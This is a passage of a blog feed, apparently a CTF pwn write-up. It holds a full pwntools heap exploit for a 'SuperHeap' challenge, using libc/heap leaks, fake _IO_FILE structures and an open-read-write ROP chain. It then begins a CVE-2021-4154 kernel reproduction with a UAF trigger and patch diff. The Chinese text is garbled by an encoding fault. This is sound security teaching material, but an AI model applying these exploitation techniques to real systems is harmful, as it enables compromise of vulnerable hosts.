class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> bookProto_pb2<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>flag = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;8.147.134.47&#x27;</span>, <span class="hljs-number">38396</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./SuperHeap&quot;</span>)<br><br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br>message = bookProto_pb2.CTFBook()<br>payload = <span class="hljs-string">b&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx, title=<span class="hljs-string">b&#x27;&#x27;</span>, author=<span class="hljs-string">b&#x27;&#x27;</span>, isbn=<span class="hljs-string">b&#x27;&#x27;</span>,publish_data=<span class="hljs-string">b&#x27;&#x27;</span>, price = <span class="hljs-number">0</span>,stock = <span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">global</span> payload<br>    sla(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    message.title = base64.b64encode(title)<br>    message.author = base64.b64encode(author)<br>    message.isbn = base64.b64encode(isbn)<br>    message.publish_date = base64.b64encode(publish_data)<br>    message.price = price<br>    message.stock = stock<br>    payload = message.SerializeToString()<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>, base64.b32encode(payload))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">search</span>(<span class="hljs-params">data</span>):<br>    sla(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;5&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>, base64.b64encode(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, title=<span class="hljs-string">b&#x27;&#x27;</span>, author=<span class="hljs-string">b&#x27;&#x27;</span>, isbn=<span class="hljs-string">b&#x27;&#x27;</span>,publish_data=<span class="hljs-string">b&#x27;&#x27;</span>, price = <span class="hljs-number">0</span>,stock = <span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">global</span> payload<br>    sla(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    message.title = base64.b64encode(title)<br>    message.author = base64.b64encode(author)<br>    message.isbn = base64.b64encode(isbn)<br>    message.publish_date = base64.b64encode(publish_data)<br>    message.price = price<br>    message.stock = stock<br>    payload = message.SerializeToString()<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>, base64.b32encode(payload))<br><br>add(<span class="hljs-number">0</span>, title=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>, author=<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x20</span>, isbn=<span class="hljs-string">b&#x27;c&#x27;</span>*<span class="hljs-number">0x20</span>, publish_data=<span class="hljs-string">b&#x27;d&#x27;</span>*<span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">1</span>, title=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>, author=<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x20</span>, isbn=<span class="hljs-string">b&#x27;c&#x27;</span>*<span class="hljs-number">0x20</span>, publish_data=<span class="hljs-string">b&#x27;d&#x27;</span>*<span class="hljs-number">0x20</span>)<br>delete(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">0</span>,publish_data=<span class="hljs-string">b&#x27;d&#x27;</span>*<span class="hljs-number">0x68</span>+<span class="hljs-string">b&#x27;e&#x27;</span>*<span class="hljs-number">8</span>)<br>show(<span class="hljs-number">0</span>)<br><br>ru(<span class="hljs-string">b&#x27;e&#x27;</span>*<span class="hljs-number">8</span>)<br>heap_base = (u64(rc(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) &lt;&lt; <span class="hljs-number">12</span>) - <span class="hljs-number">0x3000</span><br><br><br>edit(<span class="hljs-number">0</span>,publish_data=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x28</span> + p64(<span class="hljs-number">0x41</span>) + p64(heap_base+<span class="hljs-number">0x37d0</span>)+p64(heap_base+<span class="hljs-number">0x3800</span>)+p64(heap_base+<span class="hljs-number">0x3830</span>)+p64(heap_base+<span class="hljs-number">0x3860</span>)<br>     +<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x31</span>))<br><span class="hljs-comment"># search(b&#x27;e&#x27;*8)</span><br><br>add(<span class="hljs-number">1</span>, title=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>, author=<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x20</span>, isbn=<span class="hljs-string">b&#x27;c&#x27;</span>*<span class="hljs-number">0x20</span>, publish_data=<span class="hljs-string">b&#x27;d&#x27;</span>*<span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">2</span>, title=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>, author=<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x30</span>, isbn=<span class="hljs-string">b&#x27;c&#x27;</span>*<span class="hljs-number">0x30</span>, publish_data=<span class="hljs-string">b&#x27;d&#x27;</span>*<span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">3</span>, title=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>, author=<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x30</span>, isbn=<span class="hljs-string">b&#x27;c&#x27;</span>*<span class="hljs-number">0x30</span>, publish_data=<span class="hljs-string">b&#x27;d&#x27;</span>*<span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">4</span>, title=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>, author=<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x30</span>, isbn=<span class="hljs-string">b&#x27;c&#x27;</span>*<span class="hljs-number">0x30</span>, publish_data=<span class="hljs-string">b&#x27;d&#x27;</span>*<span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">5</span>, title=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>, author=<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x30</span>, isbn=<span class="hljs-string">b&#x27;c&#x27;</span>*<span class="hljs-number">0x30</span>, publish_data=<span class="hljs-string">b&#x27;d&#x27;</span>*<span class="hljs-number">0x30</span>)<br>delete(<span class="hljs-number">5</span>)<br>delete(<span class="hljs-number">4</span>)<br>delete(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">6</span>, title=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x420</span>)<br><br>edit(<span class="hljs-number">2</span>, publish_data=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x78</span>+<span class="hljs-string">b&#x27;z&#x27;</span>*<span class="hljs-number">8</span>)<br>show(<span class="hljs-number">2</span>)<br><br>ru(<span class="hljs-string">b&#x27;z&#x27;</span>*<span class="hljs-number">8</span>)<br>libc.address = u64(rc(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x21add0</span><br><br><br>edit(<span class="hljs-number">2</span>,publish_data=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x38</span> + p64(<span class="hljs-number">0x41</span>) + p64(heap_base+<span class="hljs-number">0x3a50</span>)+p64(heap_base+<span class="hljs-number">0x3a90</span>)+p64(heap_base+<span class="hljs-number">0x3ad0</span>)+p64(heap_base+<span class="hljs-number">0x3b10</span>)<br>     +<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x101</span>))<br><br><br><br><br>add(<span class="hljs-number">3</span>, title=<span class="hljs-string">b&#x27;x&#x27;</span>*<span class="hljs-number">0x30</span>, author=<span class="hljs-string">b&#x27;y&#x27;</span>*<span class="hljs-number">0x30</span>, isbn=<span class="hljs-string">b&#x27;z&#x27;</span>*<span class="hljs-number">0x30</span>, publish_data=<span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">0x30</span>)<br>delete(<span class="hljs-number">2</span>)<br><br>edit(<span class="hljs-number">1</span>,title=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x28</span> + p64(<span class="hljs-number">0x41</span>)<br>     +p64(heap_base+<span class="hljs-number">0x3860</span>) + p64(heap_base+<span class="hljs-number">0x3830</span>) + p64(heap_base+<span class="hljs-number">0x3800</span>) + p64(heap_base+<span class="hljs-number">0x37d0</span>)<br>     + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x41</span>) + p64(heap_base+<span class="hljs-number">0x3910</span>) + p64(heap_base+<span class="hljs-number">0x3950</span>)+<br>     p64(heap_base+<span class="hljs-number">0x3990</span>) + p64(heap_base+<span class="hljs-number">0x39d0</span>) + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x41</span>) + p64(libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]^((heap_base+<span class="hljs-number">0x3000</span>)&gt;&gt;<span class="hljs-number">12</span>)))<br><br>pop_rdi = libc.address + <span class="hljs-number">0x000000000002a3e5</span><br>pop_rsi = libc.address + <span class="hljs-number">0x000000000002be51</span><br>pop_rdx_r12 = libc.address + <span class="hljs-number">0x000000000011f2e7</span><br>pop_rax = libc.address + <span class="hljs-number">0x0000000000045eb0</span><br>ret = libc.address + <span class="hljs-number">0x00000000000f9b02</span><br>syscall_ret = libc.address + <span class="hljs-number">0x0000000000091316</span><br>magic = <span class="hljs-number">0x0000000000167420</span> + libc.address<br>_IO_wfile_jumps = libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>setcontext = libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br><br>_fake_wide_data_addr = heap_base + <span class="hljs-number">0x23b0</span><br>rop_addr = heap_base+<span class="hljs-number">0x2630</span><br><br>_IO_file = p64(<span class="hljs-number">0</span>) + p64(rop_addr)<br>_IO_file = _IO_file.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>_IO_file += p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>)<br>_IO_file = _IO_file.ljust(<span class="hljs-number">0xa0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>_IO_file += p64(_fake_wide_data_addr)<br>_IO_file = _IO_file.ljust(<span class="hljs-number">0xd8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>_IO_file += p64(_IO_wfile_jumps)<br><br>wide_data = <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0xe0</span><br>wide_data += p64(_fake_wide_data_addr + <span class="hljs-number">0xe0</span>)<br>wide_data += <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x60</span> + p64(magic)<br><br>rop = <span class="hljs-string">b&#x27;flag\x00\x00&#x27;</span><br>rop = rop.ljust(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>rop += p64(setcontext + <span class="hljs-number">61</span>)<br>rop = rop.ljust(<span class="hljs-number">0xa0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>rop += p64(rop_addr + <span class="hljs-number">0xb0</span>) + p64(ret)<br>rop += p64(pop_rdi) + p64(rop_addr)<br>rop += p64(pop_rsi) + p64(<span class="hljs-number">0</span>)<br>rop += p64(pop_rax) + p64(<span class="hljs-number">2</span>)<br>rop += p64(syscall_ret)<br><span class="hljs-comment">#read</span><br>rop += p64(pop_rdi) + p64(<span class="hljs-number">3</span>)<br>rop += p64(pop_rsi) + p64(rop_addr + <span class="hljs-number">0x400</span>)<br>rop += p64(pop_rdx_r12) + p64(<span class="hljs-number">0x50</span>) + p64(<span class="hljs-number">0</span>)<br>rop += p64(pop_rax) + p64(<span class="hljs-number">0</span>)<br>rop += p64(syscall_ret)<br><span class="hljs-comment">#write</span><br>rop += p64(pop_rdi) + p64(<span class="hljs-number">1</span>)<br>rop += p64(pop_rsi) + p64(rop_addr + <span class="hljs-number">0x400</span>)<br>rop += p64(pop_rdx_r12) + p64(<span class="hljs-number">0x50</span>) + p64(<span class="hljs-number">0</span>)<br>rop += p64(pop_rax) + p64(<span class="hljs-number">1</span>)<br>rop += p64(syscall_ret)<br><br>add(<span class="hljs-number">2</span>,title=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>,author=<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">4</span>,title=p64(heap_base+<span class="hljs-number">0x3420</span>)+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0xfbad2086</span>)+p64(<span class="hljs-number">0</span>),author=_IO_file,isbn=wide_data,publish_data=rop)<br><span class="hljs-comment"># gdb.attach(p)</span><br><br><br>leak(<span class="hljs-string">&quot;heap&quot;</span>,heap_base)<br>leak(<span class="hljs-string">&quot;libc&quot;</span>,libc.address)<br>sla(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;6&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="vmï¼ˆèµ›åremake-from-inkey"><a href="#vmï¼ˆèµ›åremake-from-inkey" class="headerlink" title="vmï¼ˆèµ›åremake from inkey)"></a>vmï¼ˆèµ›åremake from inkey)</h2><p>inkeyğŸ‘´ç£•äº†ä¸€å¤©ç»ˆäºå‡ºäº†ï¼Œå¤ªtmé¡¶äº†</p>]]></content>
    
    
    <categories>
      
      <category>CtfMatch</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2021-4154 Remake</title>
    <link href="/2024/03/28/dirtycred/"/>
    <url>/2024/03/28/dirtycred/</url>
    
    <content type="html"><![CDATA[<h1 id="0x00ï¼šå†™åœ¨æ‰€æœ‰ä¹‹å‰"><a href="#0x00ï¼šå†™åœ¨æ‰€æœ‰ä¹‹å‰" class="headerlink" title="0x00ï¼šå†™åœ¨æ‰€æœ‰ä¹‹å‰"></a>0x00ï¼šå†™åœ¨æ‰€æœ‰ä¹‹å‰</h1><p>åˆæ˜¯ä¸€ä¸ªæ— åœ°å€æ³„éœ²<strong>CVE</strong>çš„å¤ç°ï¼</p><p>æœ¬æ–‡æ‰€ç”¨çš„æºç å‡ä¸º<code>linux 5.8.0</code></p><h1 id="0x01ï¼šä¿¡æ¯æœé›†"><a href="#0x01ï¼šä¿¡æ¯æœé›†" class="headerlink" title="0x01ï¼šä¿¡æ¯æœé›†"></a>0x01ï¼šä¿¡æ¯æœé›†</h1><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-4154">NVD - CVE-2021-4154 (nist.gov)</a></p><p>å½±å“ç‰ˆæœ¬éå¸¸å¹¿</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240328081341.png" style="zoom:80%;" /><p>åº·ä¸€çœ¼<a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=3b0462726e7ef281c35a7a4ae33e93ee2bc9975b">commit</a></p><p>ä¸‹é¢è¿™ä¸ª<code>poc</code>å¯ä»¥é€ æˆ<strong>UAF</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//The following sequence can be used to trigger a UAF:</span><br><span class="hljs-type">int</span> fscontext_fd = fsopen(<span class="hljs-string">&quot;cgroup&quot;</span>);<br><span class="hljs-type">int</span> fd_null = open(<span class="hljs-string">&quot;/dev/null&quot;</span>, O_RDONLY);<br><span class="hljs-type">int</span> <span class="hljs-title function_">fsconfig</span><span class="hljs-params">(fscontext_fd, FSCONFIG_SET_FD, <span class="hljs-string">&quot;source&quot;</span>, fd_null)</span>;<br>close_range(<span class="hljs-number">3</span>, ~<span class="hljs-number">0U</span>, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªæ˜¯<code>patch</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">diff --git a/kernel/cgroup/cgroup-v1.c b/kernel/cgroup/cgroup-v1.c<br>index ee93b6e8958746.<span class="hljs-number">.527917</span>c0b30be4 <span class="hljs-number">100644</span><br>--- a/kernel/cgroup/cgroup-v1.c<br>+++ b/kernel/cgroup/cgroup-v1.c<br>@@ <span class="hljs-number">-912</span>,<span class="hljs-number">6</span> +<span class="hljs-number">912</span>,<span class="hljs-number">8</span> @@ <span class="hljs-type">int</span> <span class="hljs-title function_">cgroup1_parse_param</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fs_context *fc, <span class="hljs-keyword">struct</span> fs_parameter *param)</span><br> opt = fs_parse(fc, cgroup1_fs_parameters, param, &amp;result);<br> <span class="hljs-keyword">if</span> (opt == -ENOPARAM) &#123;<br> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(param-&gt;key, <span class="hljs-string">&quot;source&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>+<span class="hljs-keyword">if</span> (param-&gt;type != fs_value_is_string)<br>+<span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;Non-string source&quot;</span>);<br> <span class="hljs-keyword">if</span> (fc-&gt;source)<br> <span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;Multiple sources not supported&quot;</span>);<br> fc-&gt;source = param-&gt;<span class="hljs-built_in">string</span>;<br></code></pre></td></tr></table></figure><p>ä»¥ä¸Šä¾¿æ˜¯æ”¶é›†åˆ°çš„èµ„æ–™</p><h1 id="0x02ï¼šå‰ç½®çŸ¥è¯†"><a href="#0x02ï¼šå‰ç½®çŸ¥è¯†" class="headerlink" title="0x02ï¼šå‰ç½®çŸ¥è¯†"></a>0x02ï¼šå‰ç½®çŸ¥è¯†</h1><h2 id="æ–°ä¸€ä»£mountç³»ç»Ÿè°ƒç”¨"><a href="#æ–°ä¸€ä»£mountç³»ç»Ÿè°ƒç”¨" class="headerlink" title="æ–°ä¸€ä»£mountç³»ç»Ÿè°ƒç”¨"></a>æ–°ä¸€ä»£mountç³»ç»Ÿè°ƒç”¨</h2><p>è¿™å¤§æ¦‚æ˜¯<strong>VFS</strong>çš„èƒœåˆ©ğŸ¤”</p><p>å…ˆæ¥åº·ä¸€ä¸‹è€ç‰ˆæœ¬çš„<code>mount</code>æ˜¯æ€ä¹ˆç”¨çš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mount.h&gt;</span>  </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span>  </span><br>  <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span> &#123;  <br>        <span class="hljs-keyword">if</span> (mount(<span class="hljs-string">&quot;/dev/sdb1&quot;</span>, <span class="hljs-string">&quot;/mnt/tmp&quot;</span>, <span class="hljs-string">&quot;xfs&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>)) &#123;  <br>                perror(<span class="hljs-string">&quot;mount failed&quot;</span>);  <br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <br>&#125;<br></code></pre></td></tr></table></figure><p>ç®€å•ç²—æš´ï¼Œä¸€ä¸ªå‡½æ•°ç›´æ¥å®Œäº‹</p><p>butæ–°çš„<strong>mount API</strong>å°†è¿‡å»å°è£…çš„ä¸€ä¸ªâ€œè‡ƒè‚¿â€çš„<strong>mount</strong>æ‹†åˆ†æˆäº†è‹¥å¹²ä¸ªç³»ç»Ÿè°ƒç”¨ï¼ˆæˆ–è€…è¯´è‹¥å¹²ä¸ªç‹¬ç«‹çš„é˜¶æ®µï¼‰</p><p>é¦–å…ˆæ˜¯<strong>fsopen</strong></p><h2 id="fsopen"><a href="#fsopen" class="headerlink" title="fsopen"></a>fsopen</h2><p>å¾ˆç²—æš´çš„ç³»ç»Ÿè°ƒç”¨çš„å°è£…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br><span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br></code></pre></td></tr></table></figure><p>**fsopen()<strong>ï¼ŒåŠŸèƒ½ä¸</strong>open()<strong>ç³»ç»Ÿè°ƒç”¨éå¸¸ç›¸ä¼¼ã€‚å½“</strong>open()<strong>ç”¨äºæ‰“å¼€ä¸€ä¸ªæ–‡ä»¶å¹¶è·å–ä¸ä¹‹ç›¸å…³çš„æ–‡ä»¶æè¿°ç¬¦fdæ—¶ï¼Œ</strong>fsopen()**åˆ™æ—¨åœ¨æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶è·å–è¯¥æ–‡ä»¶ç³»ç»Ÿçš„ä¸Šä¸‹æ–‡ã€‚éšåï¼Œå®ƒä¼šå°†è¿™ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸Šä¸‹æ–‡ä¸ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ç»‘å®šï¼Œå¹¶è¿”å›è¯¥æ–‡ä»¶æè¿°ç¬¦ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Open a filesystem by name so that it can be configured for mounting.</span><br><span 